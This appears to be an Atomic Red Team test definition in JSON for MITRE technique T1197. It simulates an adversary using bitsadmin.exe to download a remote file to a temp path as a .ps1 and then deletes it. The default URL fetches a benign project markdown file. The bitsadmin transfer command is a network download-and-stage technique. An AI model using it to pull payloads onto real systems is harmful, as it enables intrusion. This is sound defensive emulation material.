{
  "id": "3c73d728-75fb-4180-a12f-6712864d7421",
  "name": "Bitsadmin Download (cmd)",
  "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "17bd8a93-54b9-43dd-889f-0ef6b9759c8c",
      "type": "execute-command",
      "data": {
        "command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "51fe1f79-bc21-4e2f-9770-9950350d71b3",
      "type": "execute-command",
      "data": {
        "command": "del #{local_file} \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "17bd8a93-54b9-43dd-889f-0ef6b9759c8c",
      "p": "on-success",
      "o": "51fe1f79-bc21-4e2f-9770-9950350d71b3"
    },
    {
      "s": "17bd8a93-54b9-43dd-889f-0ef6b9759c8c",
      "p": "on-failure",
      "o": "51fe1f79-bc21-4e2f-9770-9950350d71b3"
    }
  ],
  "tags": [
    "T1197",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "remote_file",
      "type": "url",
      "description": "Remote file to download",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
    },
    {
      "name": "local_file",
      "type": "path",
      "description": "Local file path to save downloaded file",
      "value": "%temp%\\bitsadmin1_flag.ps1"
    }
  ]
}